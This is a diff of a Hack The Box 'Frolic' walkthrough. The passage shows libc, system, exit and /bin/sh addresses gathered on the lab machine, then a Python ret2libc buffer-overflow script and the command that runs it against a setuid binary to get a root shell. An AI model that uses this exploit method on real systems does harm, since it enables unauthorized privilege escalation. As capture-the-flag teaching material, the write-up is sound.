@@ -122,9 +122,33 @@ www-data@frolic:/home/ayush/.binary$ ldd rop
         
 www-data@frolic:/home/ayush/.binary$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
  15ba0b /bin/sh
-Also in gdb we do `p system` and `p exit` to find the addresses for system and exit 
+Also in gdb we do "p system" and "p exit" to find the addresses for system and exit 
  ```
+So now we have all our addresses:
+```
+libc = 0xb7e19000
+offset = 0x0015ba0b
+/bin/sh = libc + offset = 0xb7f74a0b
+system = 0xb7e53da0
+exit = 0xb7e479d0
+```
+Now we have everything we need lets construct our script
+```python
+#!/usr/bin/python
 
+import struct
 
+buf = "A" * 52
+system = struct.pack("I" ,0xb7e53da0)
+exit = struct.pack("I" ,0xb7e479d0)
+shell = struct.pack("I" ,0xb7f74a0b)
+print buf + system + exit + shell
+```
+Then we simply run This command to exploit the binary and get a root shell and read the root flag:
+```
+./rop `python /tmp/exploit.py`
+```
+Thanks for reading and if you enjoyed make sure to check out my profile at 
+https://www.hackthebox.eu/home/users/profile/246314
 
 
